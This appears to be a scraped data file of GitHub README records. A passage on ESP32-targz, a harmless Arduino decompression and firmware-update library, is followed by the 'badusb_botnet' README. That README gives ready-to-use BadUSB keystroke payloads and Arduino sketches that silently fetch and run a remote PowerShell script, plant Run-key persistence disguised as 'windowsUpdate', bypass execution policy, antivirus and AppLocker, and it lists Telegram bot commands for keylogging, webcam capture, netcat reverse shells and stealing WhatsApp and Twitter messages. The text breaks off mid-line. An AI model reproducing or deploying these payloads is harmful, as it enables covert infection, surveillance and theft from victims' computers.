BaseUnpacker::defaultTarStatusProgressCallback ); // print the filenames as they're expanded\nTARGZUnpacker->setTarMessageCallback( myTarMessageCallback/*BaseUnpacker::targzPrintLoggerCallback*/ ); // tar log verbosity\n// mount SD\nSD.begin();\n// this .tar.gz file has both the \"app.ino.bin\" and \"app.spiffs.bin\" partitions\nfs::File file = SD.open( \"/bundle_firmware.tar.gz\", \"r\" );\nif (!file) {\nSerial.println(\"Can't open file\");\nreturn;\n}\n// this could also be a HTTP/HTTPS/UDP/Ethernet Stream\nStream *streamptr = &file;\nif( !TARGZUnpacker->tarGzStreamUpdater( streamptr ) ) {\nSerial.printf(\"tarGzStreamUpdater failed with return code #%d\\n\", TARGZUnpacker->tarGzGetError() );\n} else {\nSerial.println( \"Flashing successful, now restarting\" );\nESP.restart();\n}\nCallbacks\n// basic progress callback (valid for tar or gzip)\nvoid myBasicProgressCallback( uint8_t progress )\n{\nSerial.printf(\"Progress: %d\\n\", progress );\n}\n// complex progress callback (valid for tar or gzip)\nvoid myProgressCallback( uint8_t progress )\n{\nstatic int8_t myLastProgress = -1;\nif( myLastProgress != progress ) {\nif( myLastProgress == -1 ) {\nSerial.print(\"Progress: \");\n}\nmyLastProgress = progress;\nswitch( progress ) {\ncase 0: Serial.print(\"0% \u2593\"); break;\ncase 25: Serial.print(\" 25% \");break;\ncase 50: Serial.print(\" 50% \");break;\ncase 75: Serial.print(\" 75% \");break;\ncase 100: Serial.print(\"\u2593 100%\\n\"); myLastProgress = -1; break;\ndefault: if( progress < 100) Serial.print( \"\u2593\" ); break;\n}\n}\n}\n// General Error/Warning/Info logger\nvoid myLogger(const char* format, ...)\n{\nva_list args;\nva_start(args, format);\nvprintf(format, args);\nva_end(args);\n}\n// status callback for TAR (fired at file creation)\nvoid myTarStatusProgressCallback( const char* name, size_t size, size_t total_unpacked )\n{\nSerial.printf(\"[TAR] %-64s %8d bytes - %8d Total bytes\\n\", name, size, total_unpacked );\n}\nReturn Codes\n*Unpacker->tarGzGetError() returns a value when a problem occured:\nGeneral library error codes\n0 : Yay no error!\n-1 : Filesystem error\n-6 : Same a Filesystem error\n-7 : Update not finished? Something went wrong\n-38 : Logic error during deflating\n-39 : Logic error during gzip read\n-40 : Logic error during file creation\n-100 : No space left on device\n-101 : No space left on device\n-102 : No space left on device\n-103 : Not enough heap\n-104 : Gzip dictionnary needs to be enabled\n-105 : Gz Error when parsing header\n-106 : Gz Error when allocating memory\n-107 : General error, file integrity check fail\nUZLIB: forwarding error values from uzlib.h as is (no offset)\n-2 : Not a valid gzip file\n-3 : Gz Error TINF_DATA_ERROR\n-4 : Gz Error TINF_CHKSUM_ERROR\n-5 : Gz Error TINF_DICT_ERROR\n-41 : Gz error, can't guess filename\nUPDATE: applying -20 offset to forwarded error values from Update.h\n-8 : Updater Error UPDATE_ERROR_ABORT\n-9 : Updater Error UPDATE_ERROR_BAD_ARGUMENT\n-10 : Updater Error UPDATE_ERROR_NO_PARTITION\n-11 : Updater Error UPDATE_ERROR_ACTIVATE\n-12 : Updater Error UPDATE_ERROR_MAGIC_BYTE\n-13 : Updater Error UPDATE_ERROR_MD5\n-14 : Updater Error UPDATE_ERROR_STREAM\n-15 : Updater Error UPDATE_ERROR_SIZE\n-16 : Updater Error UPDATE_ERROR_SPACE\n-17 : Updater Error UPDATE_ERROR_READ\n-18 : Updater Error UPDATE_ERROR_ERASE\n-19 : Updater Error UPDATE_ERROR_WRITE\nTAR: applying -30 offset to forwarded error values from untar.h\n32 : Tar Error TAR_ERR_DATACB_FAIL\n33 : Tar Error TAR_ERR_HEADERCB_FAIL\n34 : Tar Error TAR_ERR_FOOTERCB_FAIL\n35 : Tar Error TAR_ERR_READBLOCK_FAIL\n36 : Tar Error TAR_ERR_HEADERTRANS_FAIL\n37 : Tar Error TAR_ERR_HEADERPARSE_FAIL\n38 : Tar Error TAR_ERROR_HEAP\nTest Suite\n\ud83d\udcf7 ESP32 capture\n\ud83d\udcf7 ESP8266 capture\nKnown bugs\ntarGzStreamExpander hates SPIFFS\ntarGzExpander/tarExpander: some formats aren't supported with SPIFFS (e.g contains symlinks or long filename/path)\ntarGzExpander without intermediate file hates situations with low heap\ntarGzExpander/gzExpander on ESP8266 : while the provided examples will work, the 32Kb dynamic allocation for gzip dictionary is unlikely to work in real world scenarios (e.g. with a webserver) and would probably require static allocation\n- tarGzExpander: files smaller than 4K aren't processed\nerror detection isn't deferred efficiently, debugging may be painful\n.tar files containing files smaller than 512 bytes aren't fully processed\nreading/writing simultaneously on SPIFFS may induce errors\nDebugging:\nESP32: use all of the \"Debug level\" values from the boards menu\nESP8266: Warning/Error when \"Debug Port:Serial\" is used, and Debug/Verbose when \"Debug Level:Core\" is selected from the boards menu\nResources\nLittleFS for ESP32\nESP8266 Sketch Data Upload tool for LittleFS\nESP32 Sketch Data Upload tool for FFat/LittleFS/SPIFFS\nAlternate links\nhttps://github.com/laukik-hase/esp_compression inflate/deflate miniz/uzlib based esp-idf implementation\nCredits:\npfalcon (uzlib maintainer)\ndsoprea (TinyUntar maintainer)\nlorol (LittleFS-ESP32 + fs plugin)\nme-no-dev (inspiration and support)\natanisoft (motivation and support)\nlbernstone (motivation and support)\nscubachristopher (contribution and support)\ninfrafast (feedback fueler)", "link": "https://github.com/tobozo/ESP32-targz", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\ud83d\udddc\ufe0f esp32-targz\nan esp32/esp8266 arduino library to provide decompression support for .tar, .gz and .tar.gz files\nthis library is a wrapper for the following two great libraries:\nuzlib https://github.com/pfalcon/uzlib\ntinyuntar https://github.com/dsoprea/tinyuntar\nthis library enables the channeling of gz \u27a1\ufe0f tar \u27a1\ufe0f filesystem data without using an intermediate file (bug: see #4).\nin order to reach this goal, tinyuntar was heavily modified to allow data streaming, uzlib is also customized.\ntradeoffs\nwhen the output is the filesystem (e.g. not when streaming to tar), gzip can work without the dictionary. disabling the dictionary can cause huge slowdowns but saves ~36kb of ram.\ntinyuntar requires 512bytes only so its memory footprint is negligible.\nlimitations\nesp32-targz can only have one output filesystem (see support matrix), and it must be set at compilation time (see usage). this limitation does not apply to the input filesystem/stream.\nscope\nthis library is only for unpacking / decompressing, no compression support is provided whatsoever\nalthough the examples use spiffs as default, it should work with any fs::fs filesystem (sd, sd_mmc, ffat, littlefs) and streams (http, https, udp, can, ethernet)\nthis is experimental, expect bugs!\ncontributions and feedback are more than welcome :-)\nsupport matrix\nfs::fs spiffs littlefs sd sd_mmc ffat\nesp32 1.0 1.0.5 1.0.5 1.0 1.0\nesp8266 builtin 0.1.0 0.1.0 n/a n/a\nusage\n\u26a0\ufe0f important note: setting the #define before including <esp32-targz.h> is mandatory otherwise it will be ignored and the library will default to spiffs.\n// set **destination** filesystem by uncommenting one of these:\n//#define dest_fs_uses_spiffs\n//#define dest_fs_uses_ffat\n//#define dest_fs_uses_sd\n//#define dest_fs_uses_sd_mmc\n#define dest_fs_uses_littlefs\n#include <esp32-targz.h>\n// filesystem object will be available as \"targzfs\"\nextract content from .gz file\n// mount spiffs (or any other filesystem)\ntargzfs.begin();\ngzunpacker *gzunpacker = new gzunpacker();\ngzunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ngzunpacker->setupfscallbacks( targztotalbytesfn, targzfreebytesfn ); // prevent the partition from exploding, recommended\ngzunpacker->setgzprogresscallback( baseunpacker::defaultprogresscallback ); // targznullprogresscallback or defaultprogresscallback\ngzunpacker->setloggercallback( baseunpacker::targzprintloggercallback ); // gz log verbosity\n// expand one file\nif( !gzunpacker->gzexpander(targzfs, \"/gz_example.gz\", targzfs, \"/gz_example.jpg\") ) {\nserial.printf(\"gzexpander failed with return code #%d\", gzunpacker->targzgeterror() );\n}\n// expand another file\nif( ! gzexpander(targzfs, \"/blah.gz\", targzfs, \"/blah.jpg\") ) {\nserial.printf(\"operation failed with return code #%d\", gzunpacker->targzgeterror() );\n}\nexpand contents from .tar file to /tmp folder\n// mount spiffs (or any other filesystem)\ntargzfs.begin();\ntarunpacker *tarunpacker = new tarunpacker();\ntarunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ntarunpacker->settarverify( true ); // true = enables health checks but slows down the overall process\ntarunpacker->setupfscallbacks( targztotalbytesfn, targzfreebytesfn ); // prevent the partition from exploding, recommended\ntarunpacker->settarprogresscallback( baseunpacker::defaultprogresscallback ); // prints the untarring progress for each individual file\ntarunpacker->settarstatusprogresscallback( baseunpacker::defaulttarstatusprogresscallback ); // print the filenames as they're expanded\ntarunpacker->settarmessagecallback( baseunpacker::targzprintloggercallback ); // tar log verbosity\nif( !tarunpacker->tarexpander(targzfs, \"/tar_example.tar\", targzfs, \"/\") ) {\nserial.printf(\"tarexpander failed with return code #%d\\n\", tarunpacker->targzgeterror() );\n}\nexpand contents from .tar.gz to /tmp folder\n// mount spiffs (or any other filesystem)\ntargzfs.begin();\ntargzunpacker *targzunpacker = new targzunpacker();\ntargzunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ntargzunpacker->settarverify( true ); // true = enables health checks but slows down the overall process\ntargzunpacker->setupfscallbacks( targztotalbytesfn, targzfreebytesfn ); // prevent the partition from exploding, recommended\ntargzunpacker->setgzprogresscallback( baseunpacker::defaultprogresscallback ); // targznullprogresscallback or defaultprogresscallback\ntargzunpacker->setloggercallback( baseunpacker::targzprintloggercallback ); // gz log verbosity\ntargzunpacker->settarprogresscallback( baseunpacker::defaultprogresscallback ); // prints the untarring progress for each individual file\ntargzunpacker->settarstatusprogresscallback( baseunpacker::defaulttarstatusprogresscallback ); // print the filenames as they're expanded\ntargzunpacker->settarmessagecallback( baseunpacker::targzprintloggercallback ); // tar log verbosity\n// using an intermediate file (default is /tmp/tmp.tar)\nif( !targzunpacker->targzexpander(targzfs, \"/targz_example.tar.gz\", targzfs, \"/tmp\") ) {\nserial.printf(\"targzexpander+intermediate file failed with return code #%d\\n\", targzunpacker->targzgeterror() );\n}\n// or without intermediate file\nif( !targzunpacker->targzexpander(targzfs, \"/targz_example.tar.gz\", targzfs, \"/tmp\", nullptr ) ) {\nserial.printf(\"targzexpander+intermediate file failed with return code #%d\\n\", targzunpacker->targzgeterror() );\n}\nflash the esp with contents from .gz file\n// mount spiffs (or any other filesystem)\ntargzfs.begin();\ngzunpacker *gzunpacker = new gzunpacker();\ngzunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ngzunpacker->setupfscallbacks( targztotalbytesfn, targzfreebytesfn ); // prevent the partition from exploding, recommended\ngzunpacker->setgzprogresscallback( baseunpacker::defaultprogresscallback ); // targznullprogresscallback or defaultprogresscallback\ngzunpacker->setloggercallback( baseunpacker::targzprintloggercallback ); // gz log verbosity\nif( ! gzunpacker->gzupdater(targzfs, firmwarefile, /*don't restart after update*/false ) ) {\nserial.printf(\"gzupdater failed with return code #%d\\n\", gzunpacker->targzgeterror() );\n}\nesp32 only: flash the esp with contents from .gz stream\n// mount spiffs (or any other filesystem)\ntargzfs.begin();\nfs::file file = targzfs.open( \"/example_firmware.gz\", \"r\" );\nif (!file) {\nserial.println(\"can't open file\");\nreturn;\n}\ngzunpacker *gzunpacker = new gzunpacker();\ngzunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ngzunpacker->setupfscallbacks( targztotalbytesfn, targzfreebytesfn ); // prevent the partition from exploding, recommended\ngzunpacker->setgzprogresscallback( baseunpacker::defaultprogresscallback ); // targznullprogresscallback or defaultprogresscallback\ngzunpacker->setloggercallback( baseunpacker::targzprintloggercallback ); // gz log verbosity\nif( !gzunpacker->gzstreamupdater( (stream *)&file, update_size_unknown ) ) {\nserial.printf(\"gzstreamupdater failed with return code #%d\\n\", gzunpacker->targzgeterror() );\n}\nesp32 only: direct expansion (no intermediate file) from .tar.gz. stream\n// mount spiffs (or any other filesystem)\ntargzfs.begin();\nfs::file file = targzfs.open( \"/example_archive.tgz\", \"r\" );\nif (!file) {\nserial.println(\"can't open file\");\nreturn;\n}\ntargzunpacker *targzunpacker = new targzunpacker();\ntargzunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ntargzunpacker->settarverify( true ); // true = enables health checks but slows down the overall process\ntargzunpacker->setupfscallbacks( targztotalbytesfn, targzfreebytesfn ); // prevent the partition from exploding, recommended\ntargzunpacker->setgzprogresscallback( baseunpacker::defaultprogresscallback ); // targznullprogresscallback or defaultprogresscallback\ntargzunpacker->setloggercallback( baseunpacker::targzprintloggercallback ); // gz log verbosity\ntargzunpacker->settarprogresscallback( baseunpacker::defaultprogresscallback ); // prints the untarring progress for each individual file\ntargzunpacker->settarstatusprogresscallback( baseunpacker::defaulttarstatusprogresscallback ); // print the filenames as they're expanded\ntargzunpacker->settarmessagecallback( baseunpacker::targzprintloggercallback ); // tar log verbosity\nif( !targzunpacker->targzstreamexpander( (stream *)&file, targzfs ) ) {\nserial.printf(\"targzstreamexpander failed with return code #%d\\n\", targzunpacker->targzgeterror() );\n}\nesp32 only: direct update (no intermediate file) from .tar.gz. stream\ntargzunpacker *targzunpacker = new targzunpacker();\ntargzunpacker->haltonerror( true ); // stop on fail (manual restart/reset required)\ntargzunpacker->settarverify( false ); // nothing to verify as we're writing a partition\ntargzunpacker->setgzprogresscallback( baseunpacker::targznullprogresscallback ); // don't care about gz progress\ntargzunpacker->settarprogresscallback( baseunpacker::defaultprogresscallback ); // prints the untarring progress for each individual partition\ntargzunpacker->settarstatusprogresscallback( baseunpacker::defaulttarstatusprogresscallback ); // print the filenames as they're expanded\ntargzunpacker->settarmessagecallback( mytarmessagecallback/*baseunpacker::targzprintloggercallback*/ ); // tar log verbosity\n// mount sd\nsd.begin();\n// this .tar.gz file has both the \"app.ino.bin\" and \"app.spiffs.bin\" partitions\nfs::file file = sd.open( \"/bundle_firmware.tar.gz\", \"r\" );\nif (!file) {\nserial.println(\"can't open file\");\nreturn;\n}\n// this could also be a http/https/udp/ethernet stream\nstream *streamptr = &file;\nif( !targzunpacker->targzstreamupdater( streamptr ) ) {\nserial.printf(\"targzstreamupdater failed with return code #%d\\n\", targzunpacker->targzgeterror() );\n} else {\nserial.println( \"flashing successful, now restarting\" );\nesp.restart();\n}\ncallbacks\n// basic progress callback (valid for tar or gzip)\nvoid mybasicprogresscallback( uint8_t progress )\n{\nserial.printf(\"progress: %d\\n\", progress );\n}\n// complex progress callback (valid for tar or gzip)\nvoid myprogresscallback( uint8_t progress )\n{\nstatic int8_t mylastprogress = -1;\nif( mylastprogress != progress ) {\nif( mylastprogress == -1 ) {\nserial.print(\"progress: \");\n}\nmylastprogress = progress;\nswitch( progress ) {\ncase 0: serial.print(\"0% \u2593\"); break;\ncase 25: serial.print(\" 25% \");break;\ncase 50: serial.print(\" 50% \");break;\ncase 75: serial.print(\" 75% \");break;\ncase 100: serial.print(\"\u2593 100%\\n\"); mylastprogress = -1; break;\ndefault: if( progress < 100) serial.print( \"\u2593\" ); break;\n}\n}\n}\n// general error/warning/info logger\nvoid mylogger(const char* format, ...)\n{\nva_list args;\nva_start(args, format);\nvprintf(format, args);\nva_end(args);\n}\n// status callback for tar (fired at file creation)\nvoid mytarstatusprogresscallback( const char* name, size_t size, size_t total_unpacked )\n{\nserial.printf(\"[tar] %-64s %8d bytes - %8d total bytes\\n\", name, size, total_unpacked );\n}\nreturn codes\n*unpacker->targzgeterror() returns a value when a problem occured:\ngeneral library error codes\n0 : yay no error!\n-1 : filesystem error\n-6 : same a filesystem error\n-7 : update not finished? something went wrong\n-38 : logic error during deflating\n-39 : logic error during gzip read\n-40 : logic error during file creation\n-100 : no space left on device\n-101 : no space left on device\n-102 : no space left on device\n-103 : not enough heap\n-104 : gzip dictionnary needs to be enabled\n-105 : gz error when parsing header\n-106 : gz error when allocating memory\n-107 : general error, file integrity check fail\nuzlib: forwarding error values from uzlib.h as is (no offset)\n-2 : not a valid gzip file\n-3 : gz error tinf_data_error\n-4 : gz error tinf_chksum_error\n-5 : gz error tinf_dict_error\n-41 : gz error, can't guess filename\nupdate: applying -20 offset to forwarded error values from update.h\n-8 : updater error update_error_abort\n-9 : updater error update_error_bad_argument\n-10 : updater error update_error_no_partition\n-11 : updater error update_error_activate\n-12 : updater error update_error_magic_byte\n-13 : updater error update_error_md5\n-14 : updater error update_error_stream\n-15 : updater error update_error_size\n-16 : updater error update_error_space\n-17 : updater error update_error_read\n-18 : updater error update_error_erase\n-19 : updater error update_error_write\ntar: applying -30 offset to forwarded error values from untar.h\n32 : tar error tar_err_datacb_fail\n33 : tar error tar_err_headercb_fail\n34 : tar error tar_err_footercb_fail\n35 : tar error tar_err_readblock_fail\n36 : tar error tar_err_headertrans_fail\n37 : tar error tar_err_headerparse_fail\n38 : tar error tar_error_heap\ntest suite\n\ud83d\udcf7 esp32 capture\n\ud83d\udcf7 esp8266 capture\nknown bugs\ntargzstreamexpander hates spiffs\ntargzexpander/tarexpander: some formats aren't supported with spiffs (e.g contains symlinks or long filename/path)\ntargzexpander without intermediate file hates situations with low heap\ntargzexpander/gzexpander on esp8266 : while the provided examples will work, the 32kb dynamic allocation for gzip dictionary is unlikely to work in real world scenarios (e.g. with a webserver) and would probably require static allocation\n- targzexpander: files smaller than 4k aren't processed\nerror detection isn't deferred efficiently, debugging may be painful\n.tar files containing files smaller than 512 bytes aren't fully processed\nreading/writing simultaneously on spiffs may induce errors\ndebugging:\nesp32: use all of the \"debug level\" values from the boards menu\nesp8266: warning/error when \"debug port:serial\" is used, and debug/verbose when \"debug level:core\" is selected from the boards menu\nresources\nlittlefs for esp32\nesp8266 sketch data upload -----> tool !!!  for littlefs\nesp32 sketch data upload -----> tool !!!  for ffat/littlefs/spiffs\nalternate links\nhttps://github.com/laukik-hase/esp_compression inflate/deflate miniz/uzlib based esp-idf implementation\ncredits:\npfalcon (uzlib maintainer)\ndsoprea (tinyuntar maintainer)\nlorol (littlefs-esp32 + fs plugin)\nme-no-dev (inspiration and support)\natanisoft (motivation and support)\nlbernstone (motivation and support)\nscubachristopher (contribution and support)\ninfrafast (feedback fueler)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000603, "year": null}, {"Unnamed: 0": 2660, "autor": 620, "date": null, "content": "badusb_botnet\n\ud83d\ude08\ud83d\udc65 Infect a pc with badusb and establish a connection through telegram.\nConfiguration\n############\n## CONFIG ##\n############\n$BotToken = \"<BOTTOKEN>\"\n$ChatID = '<CHATID>'\n$githubScript = '<you_fork/poc.ps1>'\nTo create a telegram bot: https://core.telegram.org/bots#6-botfather\nTo get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id\nOption 1: Powershell\nOption 1.1: Simple\n> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n> (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')\n> powershell.exe -windowstyle hidden -file poc.ps1\nDELAY 3000\nGUI r\nDELAY 500\nSTRING powershell\nDELAY 500\nENTER\nDELAY 750\nSTRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nDELAY 500\nENTER\nSTRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')\nDELAY 500\nENTER\nSTRING powershell.exe -windowstyle hidden -file poc.ps1\nDELAY 500\nENTER\nLink to convert to .ino: https://malduino.com/converter/\nOption 1.2: Backdoor\n> reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsUpdate /f\n> Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\\Users\\$env:username\\Documents\\windowsUpdate.ps1\n> reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsUpdate /t REG_SZ /d \"powershell.exe -windowstyle hidden -file C:\\Users\\$env:username\\Documents\\windowsUpdate.ps1\"\nDELAY 3000\nGUI r\nDELAY 500\nSTRING powershell\nDELAY 500\nENTER\nDELAY 750\nSTRING reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsUpdate /f\nDELAY 500\nENTER\nSTRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\\Users\\$env:username\\Documents\\windowsUpdate.ps1\nDELAY 500\nENTER\nSTRING reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsUpdate /t REG_SZ /d \"powershell.exe -windowstyle hidden -file C:\\Users\\$env:username\\Documents\\windowsUpdate.ps1\"\nDELAY 500\nENTER\nLink to convert to .ino: https://malduino.com/converter/\nOption 2: CMD\nWindows Powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. To download a file with cmd, we can use two options: bitsadmin or certutil.exe. (Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions. For XP/2003 you'll need the Admin Tool Pack for windows server 2003).\nSyntax\n> bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\\10mb.zip\n> certutil.exe -urlcache -split -f \"https://download.sysinternals.com/files/PSTools.zip\" pstools.zip\nOption 2.1: Simple\n> certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" \"Documents/windowsUpdate.ps1\"\n> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\n> powershell.exe -windowstyle hidden -file \"Documents/windowsUpdate.ps1\"\nor\n> certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" \"Documents/windowsUpdate.ps1\"\n> powershell.exe -windowstyle hidden -executionPolicy bypass -file \"Documents/windowsUpdate.ps1\"\nAvast detects this last option.\nOption 2.2: Backdoor\n> certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" Documents\\windowsUpdate.ps1\n> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\n> reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsUpdate /t REG_SZ /d \"powershell.exe -windowstyle hidden -file C:\\Users\\$env:username\\Documents\\windowsUpdate.ps1\"\n> reboot (?)\nExample with digispark\n#define kbd_es_es\n#include \"DigiKeyboard.h\"\nvoid setup() {\n}\nvoid loop() {\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(\"powershell -noe -c \\\". mode.com con: lines=1 cols=40\\\"\");\n//DigiKeyboard.print(\"cmd\");\n//DigiKeyboard.print(\"cmd /k mode con:cols=20 lines=1\");\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(3000);\nDigiKeyboard.print(\"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\");\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(200);\nDigiKeyboard.print(\"S\");\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\");\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(\"(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')\");\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(\"powershell.exe -windowstyle hidden -file poc.ps1\");\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nfor (;;) {\n/*empty*/\n}\n}\nGet the drivers: https://github.com/digistump/DigistumpArduino/releases\nAdditional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json\nDigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h\nKeyboard en_US to es_ES: https://github.com/ernesto-xload/DigisparkKeyboard Decompress the archive and put all in : C:\\Users\\Administrador\\AppData\\Local\\Arduino15\\packages\\digistump\\hardware\\avr\\1.6.7\\libraries\\DigisparkKeyboard, later in the script you must put the following line to specify the keyboard layout.\n#define kbd_es_es\nExample with ATMega32u4\nFirst, we need put the keyboard.h library in es_ES, to do this you can copy the Keyboard directory of this project into: \"C:\\Program Files (x86)\\Arduino\\libraries\".\n#include <Keyboard.h>\nvoid setup() {\nKeyboard.begin(); //Start keyboard communication\ndelay(3000);\nKeyboard.press(KEY_LEFT_GUI);\ndelay(500);\nKeyboard.press('r');\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.println(\"cmd\");\ndelay(500);\nKeyboard.press(KEY_RETURN);\ndelay(100);\nKeyboard.releaseAll();\nKeyboard.println(\"certutil.exe -urlcache -split -f \\\"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\\\" \\\"Documents/poc.ps1\\\"\");\ndelay(500);\nKeyboard.press(KEY_RETURN);\nKeyboard.release(KEY_RETURN);\nKeyboard.println(\"powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\");\ndelay(500);\nKeyboard.press(KEY_RETURN);\nKeyboard.release(KEY_RETURN);\nKeyboard.println(\"powershell.exe -windowstyle hidden -file \\\"Documents/poc.ps1\\\"\");\ndelay(500);\nKeyboard.press(KEY_RETURN);\nKeyboard.release(KEY_RETURN);\n}\nvoid loop() {\n}\nWe use the \\\" to scape the double quotes in Arduino code.\nExample with bitsadmin\nKeyboard.println(\" bitsadmin /transfer \\\"Descargando Drivers USB\\\" /download /priority high \\\"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\\\" %TEMP%/poc.ps1 && echo Instalando Drivers: \");\nEvade AVs\nObfuscating Binary Names\nFor Loop Value Extraction\nFOR /F \u201cdelims=s\\ tokens=4\u201d %a IN (\u2018set^|findstr PSM\u2019)DO %a\nExample:\nKeyboard.println(\" FOR /F \\\"delims=/ tokens=1\\\" %a IN ('where certutil')DO %a -urlcache -split -f \\\"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\\\" \\\"Documents/poc.ps1\\\" \");\nBypass AppLocker\nPolicies of AppLocker are stored in HKEY_LOCAL_Machine\\Software\\Policies\\Microsoft\\Windows\\SrpV2, You can verify the folders in which you have permission to run .ps1 scripts.\nTelegram Options\nBasic\n/list (List all devices availables)\n/select IP command (Execute a command)\n/stop IP (Stop remote connection)\n/cleanAll IP (Clean all files)\n/ipPublic IP (Geolocate IP)\n/download IP file (Download a file from PC)\nAdvanced\n/screenshot IP (Capture screen)\n/backdoor IP (Create a persistent backdoor)\n/webcam IP\n/keylogger IP time in seconds\n/nc IP IP to connect ($ip) (First you must use nc -lp 8888 -v to create a listener)\n/stopnc IP (Stop nc.exe and erase all archives)\nUltra :squirrel:\n/hackT IP (Get Twitter messages if the victim is authenticated) [Only web - W10]\n/hackW IP (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]\n/starttwitch IP STREAM_KEY (Start a video transmission on Twitch with ffmpeg)\n/stoptwitch IP (Stop ffmpeg.exe and erase all archives)\nPoCs\n\ud83d\udd17\ud83d\udcfa TOUR - POC\n\ud83d\udd17\ud83d\udcfa TWITCH STREAMING - POC\n\ud83d\udd17\ud83d\udcfa KEYLOGGER - POC\n\ud83d\udd17\ud83d\udcfa DIGISPARK - POC\n{TODO}\nChange all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)\nCreate an ID for each connected user.\nHack WhatsApp on .exe.\n\u2714\ufe0f Fix Twitch streaming.\n\u2714\ufe0f Fix keylogger.\nAdd monitor selector to screenshot.\nAdd windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.\nAdd hackGmail().\n\u2714\ufe0f Verbose via telegram messages.\n\u2714\ufe0f Netcat reverse connection.", "link": "https://github.com/alexfrancow/badusb_botnet", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "badusb_botnet\n\ud83d\ude08\ud83d\udc65 infect a pc with badusb and establish a connection through telegram.\nconfiguration\n############\n## config ##\n############\n$bottoken = \"<bottoken>\"\n$chatid = '<chatid>'\n$githubscript = '<you_fork/poc.ps1>'\nto create a telegram bot: https://core.telegram.org/bots#6-botfather\nto get chatid: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id\noption 1: powershell\noption 1.1: simple\n> [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n> (new-object net.webclient).downloadfile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')\n> powershell.exe -windowstyle hidden -file poc.ps1\ndelay 3000\ngui r\ndelay 500\nstring powershell\ndelay 500\nenter\ndelay 750\nstring [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\ndelay 500\nenter\nstring (new-object net.webclient).downloadfile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')\ndelay 500\nenter\nstring powershell.exe -windowstyle hidden -file poc.ps1\ndelay 500\nenter\nlink to convert to .ino: https://malduino.com/converter/\noption 1.2: backdoor\n> reg delete hkey_current_user\\software\\microsoft\\windows\\currentversion\\run /v windowsupdate /f\n> invoke-webrequest -uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -outfile 